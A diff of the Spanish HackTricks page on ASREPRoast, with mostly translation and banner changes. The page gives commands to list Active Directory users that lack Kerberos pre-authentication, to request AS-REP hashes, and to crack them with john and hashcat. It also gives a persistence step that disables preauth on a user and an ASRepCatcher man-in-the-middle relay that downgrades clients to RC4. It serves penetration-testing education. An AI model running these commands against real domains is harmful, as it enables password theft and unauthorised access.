@@ -1,47 +1,48 @@
 # ASREPRoast
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Experto en Red Team de AWS de HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Otras formas de apoyar a HackTricks:
-
-* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Únete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!
+Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!
 
-**Perspectivas de Hacking**\
-Involúcrate con contenido que profundiza en la emoción y desafíos del hacking
+**Hacking Insights**\
+Engage with content that delves into the thrill and challenges of hacking
 
-**Noticias de Hacking en Tiempo Real**\
-Mantente al día con el mundo del hacking a través de noticias e información en tiempo real
+**Real-Time Hack News**\
+Keep up-to-date with fast-paced hacking world through real-time news and insights
 
-**Últimos Anuncios**\
-Mantente informado sobre los nuevos programas de recompensas por bugs y actualizaciones importantes de plataformas
+**Latest Announcements**\
+Stay informed with the newest bug bounties launching and crucial platform updates
 
-**Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy!
+**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!
 
 ## ASREPRoast
 
-ASREPRoast es un ataque de seguridad que explota a usuarios que carecen del **atributo requerido de preautenticación de Kerberos**. Esencialmente, esta vulnerabilidad permite a los atacantes solicitar autenticación para un usuario desde el Controlador de Dominio (DC) sin necesidad de la contraseña del usuario. El DC luego responde con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar descifrar sin conexión para descubrir la contraseña del usuario.
+ASREPRoast es un ataque de seguridad que explota a los usuarios que carecen del **atributo requerido de pre-autenticación de Kerberos**. Esencialmente, esta vulnerabilidad permite a los atacantes solicitar autenticación para un usuario desde el Controlador de Dominio (DC) sin necesidad de la contraseña del usuario. El DC responde con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar descifrar fuera de línea para descubrir la contraseña del usuario.
 
 Los principales requisitos para este ataque son:
 
-* **Falta de preautenticación de Kerberos**: Los usuarios objetivo no deben tener esta característica de seguridad habilitada.
+* **Falta de pre-autenticación de Kerberos**: Los usuarios objetivo no deben tener habilitada esta función de seguridad.
 * **Conexión al Controlador de Dominio (DC)**: Los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
-* **Cuenta de dominio opcional**: Tener una cuenta de dominio permite a los atacantes identificar de manera más eficiente a los usuarios vulnerables a través de consultas LDAP. Sin dicha cuenta, los atacantes deben adivinar nombres de usuario.
+* **Cuenta de dominio opcional**: Tener una cuenta de dominio permite a los atacantes identificar de manera más eficiente a los usuarios vulnerables a través de consultas LDAP. Sin dicha cuenta, los atacantes deben adivinar los nombres de usuario.
 
 #### Enumerando usuarios vulnerables (necesita credenciales de dominio)
 
-{% code title="Usando Windows" %}
+{% code title="Using Windows" %}
 ```bash
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -51,9 +52,7 @@ Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
 ```
-{% endcode %}
-
-#### Solicitar mensaje AS_REP
+#### Solicitar mensaje AS\_REP
 
 {% code title="Usando Linux" %}
 ```bash
@@ -72,19 +71,19 @@ Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github
 {% endcode %}
 
 {% hint style="warning" %}
-El Roast de AS-REP con Rubeus generará un 4768 con un tipo de cifrado de 0x17 y un tipo de preautenticación de 0.
+AS-REP Roasting con Rubeus generará un 4768 con un tipo de cifrado de 0x17 y un tipo de preautenticación de 0.
 {% endhint %}
 
-### Descifrado
+### Cracking
 ```bash
 john --wordlist=passwords_kerb.txt hashes.asreproast
 hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Persistencia
 
-Forzar **preauth** no requerido para un usuario en el que tenga permisos de **GenericAll** (o permisos para escribir propiedades):
+Forzar **preauth** no requerido para un usuario donde tienes permisos **GenericAll** (o permisos para escribir propiedades):
 
-{% code title="Usando Windows" %}
+{% code title="Using Windows" %}
 ```bash
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -94,10 +93,12 @@ Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbos
 ```bash
 bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
 ```
+{% endcode %}
+
 ## ASREProast sin credenciales
 
-Un atacante puede utilizar una posición de intermediario para capturar paquetes AS-REP mientras atraviesan la red sin depender de que la preautenticación de Kerberos esté deshabilitada. Por lo tanto, funciona para todos los usuarios en la VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite hacerlo. Además, la herramienta obliga a las estaciones de trabajo cliente a utilizar RC4 alterando la negociación de Kerberos.
+Un atacante puede usar una posición de hombre en el medio para capturar paquetes AS-REP mientras atraviesan la red sin depender de que la pre-autenticación de Kerberos esté deshabilitada. Por lo tanto, funciona para todos los usuarios en la VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite hacerlo. Además, la herramienta obliga a las estaciones de trabajo de los clientes a usar RC4 al alterar la negociación de Kerberos.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -116,29 +117,30 @@ ASRepCatcher listen
 
 <figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>
 
-Únete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!
+¡Únete al servidor de [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para comunicarte con hackers experimentados y cazadores de bugs!
 
 **Perspectivas de Hacking**\
-Participa en contenido que explora la emoción y los desafíos del hacking
+Participa en contenido que profundiza en la emoción y los desafíos del hacking
 
-**Noticias de Hacking en Tiempo Real**\
-Mantente al día con el mundo del hacking a través de noticias e información en tiempo real
+**Noticias de Hackeo en Tiempo Real**\
+Mantente al día con el mundo del hacking de ritmo rápido a través de noticias e información en tiempo real
 
 **Últimos Anuncios**\
-Mantente informado sobre los nuevos programas de recompensas por bugs y actualizaciones importantes de plataformas
+Mantente informado sobre las nuevas recompensas por bugs que se lanzan y actualizaciones cruciales de la plataforma
 
-**Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) ¡y comienza a colaborar con los mejores hackers hoy!
+**Únete a nosotros en** [**Discord**](https://discord.com/invite/N3FrSbmwdy) y comienza a colaborar con los mejores hackers hoy mismo!
+
+{% hint style="success" %}
+Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Apoya a HackTricks</summary>
 
-Otras formas de apoyar a HackTricks:
-
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* ¡Consulta los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
+{% endhint %}
